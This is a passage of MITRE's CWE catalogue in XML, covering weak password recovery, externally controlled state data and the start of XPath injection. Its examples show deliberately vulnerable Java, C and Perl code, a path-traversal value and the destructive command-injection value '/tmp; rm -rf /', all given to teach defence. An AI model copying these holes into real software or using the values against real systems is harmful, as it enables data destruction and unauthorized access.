      <Weakness ID="640" Name="Weak Password Recovery Mechanism for Forgotten Password" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product contains a mechanism for users to recover or change their passwords without knowing the original password, but the mechanism is weak.</Description>
         <Extended_Description>
            <xhtml:p>It is common for an application to have a mechanism that provides a means for a user to gain access to their account in the event they forget their password. Very often the password recovery mechanism is weak, which has the effect of making it more likely that it would be possible for a person other than the legitimate system user to gain access to that user's account. Weak password recovery schemes completely undermine a strong password authentication scheme.</xhtml:p>
            <xhtml:p>This weakness may be that the security question is too easy to guess or find an answer to (e.g. because the question is too common, or the answers can be found using social media). Or there might be an implementation weakness in the password recovery mechanism code that may for instance trick the system into e-mailing the new password to an e-mail account other than that of the user. There might be no throttling done on the rate of password resets so that a legitimate user can be denied service by an attacker if an attacker tries to recover their password in a rapid succession. The system may send the original password to the user rather than generating a new temporary password. In summary, password recovery functionality, if not carefully designed and implemented can often become the system's weakest link that can be misused in a way that would allow an attacker to gain unauthorized access to the system.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1390" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could gain unauthorized access to the system by retrieving legitimate user's authentication credentials.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Resource Consumption (Other)</Impact>
               <Note>An attacker could deny service to legitimate system users by launching a brute force attack on the password recovery mechanism using user ids of legitimate users.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>The system's security functionality is turned against the system by the attacker.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Make sure that all input supplied by the user to the password recovery mechanism is thoroughly filtered and validated.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not use standard weak security questions and use several security questions.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Make sure that there is throttling on the number of incorrect answers to a security question. Disable the password recovery functionality after a certain (small) number of incorrect guesses.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Require that the user properly answers the security question prior to resetting their password and sending the new password to the e-mail address of record.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Never allow the user to control what e-mail address the new password will be sent to in the password recovery mechanism.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Assign a new temporary password rather than revealing the original password.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>A famous example of this type of weakness being exploited is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>49</Entry_ID>
               <Entry_Name>Insufficient Password Recovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="50"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 19: Use of Weak Password-Based Systems.&#34; Page 279"/>
         </References>
         <Notes>
            <Note Type="Maintenance">This entry might be reclassified as a category or "loose composite," since it lists multiple specific errors that can make the mechanism weak. However, under view 1000, it could be a weakness under protection mechanism failure, although it is different from most PMF issues since it is related to a feature that is designed to bypass a protection mechanism (specifically, the lack of knowledge of a password).</Note>
            <Note Type="Maintenance">This entry probably needs to be split; see extended description.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Evgeny Lebanidze</Submission_Name>
               <Submission_Organization>Cigital</Submission_Organization>
               <Submission_Date>2008-01-30</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Maintenance_Notes, Name, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-09-09">Weak Password Recovery Mechanism</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="642" Name="External Control of Critical State Data" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product stores security-critical state information about its users, or the product itself, in a location that is accessible to unauthorized actors.</Description>
         <Extended_Description>
            <xhtml:p>If an attacker can modify the state information without detection, then it could be used to perform unauthorized actions or access unexpected resources, since the application programmer does not expect that the state can be changed.</xhtml:p>
            <xhtml:p>State information can be stored in various locations such as a cookie, in a hidden web form field, input parameter or argument, an environment variable, a database record, within a settings file, etc. All of these locations have the potential to be modified by an attacker. When this state information is used to control security or determine resource usage, then it may create a vulnerability. For example, an application may perform authentication, then save the state in an "authenticated=true" cookie. An attacker may simply create this cookie in order to bypass the authentication.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could potentially modify the state in malicious ways. If the state is related to the privileges or level of authentication that the user has, then state modification might allow the user to bypass authentication or elevate privileges.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>The state variables may contain sensitive information that should not be known by the client.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>By modifying state variables, the attacker could violate the application's expectations for the contents of the state, leading to a denial of service due to an unexpected error condition.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Understand all the potential locations that are accessible to attackers. For example, some programmers assume that cookies and hidden form fields cannot be modified by an attacker, or they may not consider that environment variables can be modified before a privileged program is invoked.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-14">
               <Phase>Architecture and Design</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Store state information and sensitive data on the server side only.</xhtml:p>
                  <xhtml:p>Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.</xhtml:p>
                  <xhtml:p>If information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that you has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328).</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Store state information on the server side only. Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>With a stateless protocol such as HTTP, use some frameworks can maintain the state for you.</xhtml:p>
                  <xhtml:p>Examples include ASP.NET View State and the OWASP ESAPI Session Management feature.</xhtml:p>
                  <xhtml:p>Be careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Cookie[] cookies = request.getCookies();<xhtml:br/>for (int i =0; i&lt; cookies.length; i++) {<xhtml:div style="margin-left:1em;">Cookie c = cookies[i];<xhtml:br/>if (c.getName().equals("authenticated") &amp;&amp; Boolean.TRUE.equals(c.getValue())) {<xhtml:div style="margin-left:1em;">authenticated = true;</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-65">
               <Intro_Text>The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as "../../tomcat/conf/server.xml", which causes the application to delete one of its own configuration files (CWE-22).</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String rName = request.getParameter("reportName");<xhtml:br/>File rFile = new File("/usr/local/apfr/reports/" + rName);<xhtml:br/>...<xhtml:br/>rFile.delete();</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-66">
               <Intro_Text>The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>fis = new FileInputStream(cfg.getProperty("sub")+".txt");<xhtml:br/>amt = fis.read(arr);<xhtml:br/>out.println(arr);</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-67">
               <Intro_Text>This program is intended to execute a command that lists the contents of a restricted directory, then performs other actions. Assume that it runs with setuid privileges in order to bypass the permissions check by the operating system.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>#define DIR "/restricted/directory"<xhtml:br/>
                     <xhtml:br/>char cmd[500];<xhtml:br/>sprintf(cmd, "ls -l %480s", DIR);<xhtml:br/>
                     <xhtml:i>/* Raise privileges to those needed for accessing DIR. */</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>RaisePrivileges(...);<xhtml:br/>system(cmd);<xhtml:br/>DropPrivileges(...);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code may look harmless at first, since both the directory and the command are set to fixed values that the attacker can't control. The attacker can only see the contents for DIR, which is the intended program behavior. Finally, the programmer is also careful to limit the code that executes with raised privileges.</Body_Text>
               <Body_Text>However, because the program does not modify the PATH environment variable, the following attack would work:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:ul>
                     <xhtml:li>The user sets the PATH to reference a directory under the attacker's control, such as "/my/dir/".</xhtml:li>
                     <xhtml:li>The attacker creates a malicious program called "ls", and puts that program in /my/dir</xhtml:li>
                     <xhtml:li>The user executes the program.</xhtml:li>
                     <xhtml:li>When system() is executed, the shell consults the PATH to find the ls program</xhtml:li>
                     <xhtml:li>The program finds the attacker's malicious program, "/my/dir/ls". It doesn't find "/bin/ls" because PATH does not contain "/bin/".</xhtml:li>
                     <xhtml:li>The program executes the attacker's malicious program with the raised privileges.</xhtml:li>
                  </xhtml:ul>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code segment implements a basic server that uses the "ls" program to perform a directory listing of the directory that is listed in the "HOMEDIR" environment variable. The code intends to allow the user to specify an alternate "LANG" environment variable. This causes "ls" to customize its output based on a given language, which is an important capability when supporting internationalization.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>$ENV{"HOMEDIR"} = "/home/mydir/public/";<xhtml:br/>my $stream = AcceptUntrustedInputStream();<xhtml:br/>while (&lt;$stream&gt;) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>chomp;<xhtml:br/>if (/^ENV ([\w\_]+) (.*)/) {<xhtml:div style="margin-left:1em;">$ENV{$1} = $2;</xhtml:div>}<xhtml:br/>elsif (/^QUIT/) { ... }<xhtml:br/>elsif (/^LIST/) {<xhtml:div style="margin-left:1em;">open($fh, "/bin/ls -l $ENV{HOMEDIR}|");<xhtml:br/>while (&lt;$fh&gt;) {<xhtml:div style="margin-left:1em;">SendOutput($stream, "FILEINFO: $_");</xhtml:div>}<xhtml:br/>close($fh);</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer takes care to call a specific "ls" program and sets the HOMEDIR to a fixed value. However, an attacker can use a command such as "ENV HOMEDIR /secret/directory" to specify an alternate directory, enabling a path traversal attack (CWE-22). At the same time, other attacks are enabled as well, such as OS command injection (CWE-78) by setting HOMEDIR to a value such as "/tmp; rm -rf /". In this case, the programmer never intends for HOMEDIR to be modified, so input validation for HOMEDIR is not the solution. A partial solution would be an allowlist that only allows the LANG variable to be specified in the ENV command. Alternately, assuming this is an authenticated user, the language could be stored in a local file so that no ENV command at all would be needed.</Body_Text>
               <Body_Text>While this example may not appear realistic, this type of problem shows up in code fairly frequently. See CVE-1999-0073 in the observed examples for a real-world example with similar behaviors.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-2428</Reference>
               <Description>Mail client stores password hashes for unrelated accounts in a hidden form field.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2428</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0306</Reference>
               <Description>Privileged program trusts user-specified environment variable to modify critical configuration settings.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0306</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-0073</Reference>
               <Description>Telnet daemon allows remote clients to specify critical environment variables for the server, leading to code execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-0073</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4432</Reference>
               <Description>Untrusted search path vulnerability through modified LD_LIBRARY_PATH environment variable.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4432</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-7191</Reference>
               <Description>Untrusted search path vulnerability through modified LD_LIBRARY_PATH environment variable.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-7191</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5738</Reference>
               <Description>Calendar application allows bypass of authentication by setting a certain cookie value to 1.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5738</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5642</Reference>
               <Description>Setting of a language preference in a cookie enables path traversal attack.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5642</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5125</Reference>
               <Description>Application allows admin privileges by setting a cookie value to "admin."</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5125</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5065</Reference>
               <Description>Application allows admin privileges by setting a cookie value to "admin."</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5065</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4752</Reference>
               <Description>Application allows admin privileges by setting a cookie value to "admin."</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4752</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0102</Reference>
               <Description>Shopping cart allows price modification via hidden form field.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0102</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0253</Reference>
               <Description>Shopping cart allows price modification via hidden form field.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0253</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1319</Reference>
               <Description>Server allows client to specify the search path, which can be modified to point to a program that the client has uploaded.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1319</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="21"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-528"/>
            <Reference External_Reference_ID="REF-529"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 4: Use of Magic URLs, Predictable Cookies, and Hidden Form&#xA;                  Fields.&#34; Page 75"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Evgeny Lebanidze</Submission_Name>
               <Submission_Organization>Cigital</Submission_Organization>
               <Submission_Date>2008-01-30</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Name, Observed_Examples, Potential_Mitigations, References, Relationships, Relevant_Properties, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Enabling_Factors_for_Exploitation, Modes_of_Introduction, References, Relationships, Relevant_Properties</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Insufficient Management of User State</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">External Control of User State Data</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="643" Name="Improper Neutralization of Data within XPath Expressions ('XPath Injection')" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product uses external input to dynamically construct an XPath expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.</Description>
         <Extended_Description>The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication).</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="91" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
